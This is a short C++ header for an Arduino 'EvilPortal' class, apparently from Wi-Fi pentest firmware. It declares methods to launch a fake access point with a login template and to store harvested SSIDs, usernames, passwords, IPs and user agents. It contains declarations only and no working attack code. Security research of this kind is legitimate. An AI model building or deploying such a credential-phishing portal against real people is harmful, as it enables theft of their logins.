#ifndef EVILPORTAL_H
#define EVILPORTAL_H

#include <Arduino.h>

struct PortalCred {
    String ssid;
    String username;
    String password;
    String ip;
    String ua;
    unsigned long time;
};

class EvilPortal {
public:
    static void init();
    static void begin(const char* ssid);
    static void stop();
    static void loop();
    static bool isActive();
    static void setTemplate(const char* path);
    static void addCredential(const char* user, const char* pass);
    static int getCredentialCount();
    static bool saveCredentials();
};

#endif
